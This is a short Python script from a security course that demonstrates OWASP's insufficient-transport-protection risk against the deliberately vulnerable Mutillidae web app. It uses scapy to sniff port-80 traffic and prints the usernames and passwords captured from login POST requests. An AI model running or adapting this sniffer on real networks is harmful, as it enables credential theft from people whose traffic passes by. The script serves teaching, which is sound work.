
'''
Created on 11.09.2013

@author: Christoph (SPSE 1163)


you can find this file in my repo on bitbucket.org: 

https://bitbucket.org/chbb/spse/src/master/module4/owasp_a9_insufficientTransportLayerProtection.py?at=master


This is a small demo script for the 'mutillidae' broken WebApplication and
the 'OWASP A9 - insuficientTransportLayerProtection' topic. 
This script looks for usernames and passwords submitted with the login form. 
'''
import argparse
import re
from scapy.all import *


def http_callback(pkt):
    """
    This funtion print usernames and passwords found in the HTTP Paket
    @param pkt: received packet  
    """
    if pkt.haslayer(Raw):
        raw = pkt.getlayer(Raw).load
        r = raw.split("\r\n")
        
        if r[0].startswith("POST /mutillidae/index.php?page=login.php"):
            m = re.search(r"username=([\S]+)&password=([\S]+)&", raw)
            print "[+] username: {0} password: {1}".format(m.group(1), 
                                                       m.group(2))
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-i", "--interface", required=False, default="eth0", 
                        help="Interface from which to capture data")
    args = parser.parse_args()
    
    # create a sniffer for the HTTP protocol
    pkts = sniff(iface=args.interface, filter="tcp port 80", prn=http_callback)
    
    